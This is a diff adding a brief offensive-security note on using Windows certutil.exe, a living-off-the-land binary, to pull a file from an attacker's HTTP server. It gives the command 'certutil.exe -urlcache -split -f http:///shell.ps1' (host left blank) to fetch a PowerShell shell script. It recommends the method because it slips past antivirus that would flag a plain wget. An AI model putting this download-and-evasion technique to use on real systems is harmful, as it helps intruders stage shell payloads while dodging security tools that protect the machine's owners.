@@ -1,0 +1,8 @@
+This is for when you have an attackbox with a http server where you
+want to get the data from it. CertUtil is a part of LOLBins and will therefore
+pass a few different AVs rather than just hitting a regular wget, which could
+cause some red flags.
+
+certutil.exe -urlcache -split -f http:///shell.ps1
+
+
